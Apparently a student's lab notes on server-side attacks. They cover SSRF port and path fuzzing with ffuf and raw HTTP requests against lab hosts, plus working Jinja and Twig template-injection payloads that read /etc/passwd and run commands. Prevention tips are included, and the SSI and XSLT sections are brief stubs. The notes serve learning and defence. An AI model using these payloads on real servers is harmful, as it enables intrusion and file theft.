#CWES 


### Common types of server-side attacks:
#### **SSRF: server side request forgery**
An attacks manipulates the server to send requests on their behalf.

Typical case: Server fetches remote resources based on user input, if done incorrectly the attacker might force the server into making arbitrary requests.   Note we can use different URL schemes: HTTP(s), file, gopher, etc.

Example of fuzzing a webrequest to enumerate ports on the server:
```shell
ffuf -w ports.txt -u http://10.129.85.188/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect"
```

Ex: Reaching a hidden application via SSRF:
The /index.php endpoint has a post parameter which lets us send requests on the behalf of the server. And with the fuzzing above we found out an application is running on port 8000. We cannot access it directly via the browser - probably not exposed, or connection is blocked by firewall. 
```
POST /index.php HTTP/1.1
Host: 10.129.85.188
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: http://10.129.85.188
Connection: keep-alive
Referer: http://10.129.85.188/
Priority: u=0

dateserver=http://127.0.0.1:8000
```
- BUT the server can reach the hidden application via the loopback interface. 

```
POST /index.php HTTP/1.1
Host: 10.129.85.188
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://10.129.85.188
Connection: keep-alive
Referer: http://10.129.85.188/
Priority: u=0

dateserver=http://10.129.85.188:8000
```
- BUT notice that we cannot access the server via the VPN facing network ip. It does not work, most likely because it does not listens to this address. 

Just like the example above, we could try to enumerate different subdirectories via SSRF:
```shell
ffuf -w raft-small-words.txt -u http://10.129.87.75/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```
- This can be done via burp as well, but would be much slower. 
- And again, the http://dateserver.htb is a site normal users are not allowed to visit, but the website server is trusted, hence we must do this enumeration via the SSRF. 

Another way to enumerate this service would be to try different URL schemes, such as file or gopher. 
- Useful resource: https://github.com/tarunkant/Gopherus  

**Blind SSRF:**
- There is also something called blind SSRF, where we cannot we the full response of our SSRF requests. 
- They are harder to exploit and harder to detect, but we are still sending requests via the server, so there is potential harm to be made. 
- A way to check for blind SSRF, so to forge a request to a site we know the server can reach - for example itself! So if ex: 127.0.0.1:80/index.php does not return the original site or any html, we are dealing with blind SSRF. 
- Exploiting can be hard, but one way is to observer differences in the error messages when we try to visit different subdirectories / ports / files, by which we can deduce what is open/available. 

**Prevention:**
- If the server needs to make remote requests, it should have a whitelist of which it is allowed to fetch from. 
- Whitelist URL schemes 
- Sanitize userinput - as we always do with userinput. 
- A firewall could also be configured to prevent SSRF.
https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html 

 
 **SSTI: Server side template injection**
Exploiting templating engines and server-side templates to generate responses, ex. HTML content dynamically. 

- Template engines: Software that combines pre-defined templates with dynamically generated data. Engine examples: Jinja=python/flask/django and Twig
- SSTI occurs when the attack can inject code into the template via a template parameter, which is later rendered on the server. This might make the server execute the code we injected.

First step i checking if it is vulnerable or not, and then check what template engine it is. We have a payload map which can help us deduce this:
![[Pasted image 20260507050724.png]]

Once we know the type of engine, we have more information on how to exploit it. If it is **Jinja** (python based) we can do: 
Dump info:
```python
{{ config.items() }}


{{ self.__init__.__globals__.__builtins__ }}

```

Read files:
```python
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

Gain RCE:
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Exploiting Twig(PHP based engine):**
Info dump:
```php
{{ _self }}
```

Read files:
```php
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

RCE:
```php
{{ ['id'] | filter('system') }}
```

Exploiting SSTI is much about understanding the engine syntax in the system we want to hack, read the doc or check out: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md for more details. 

Other tools that help automate this process: https://github.com/vladko312/SSTImap 


**Preventing SSTI:**
- User input should never be passed to the template engines rendering function in the template parameter. 
- Remove dangerous functions from the engine which we do not need. 

**SSI: Server side includes injection**
Similar to SSTI, can be used to generate html response from the server and include additional content dynamically. 

 
 **XSLT: Extensible stylesheet language transformations - server side injection** 
XSTL is a language used to transform XML docs into other formats, example html. This vulnerability exploits this type of transformation. 






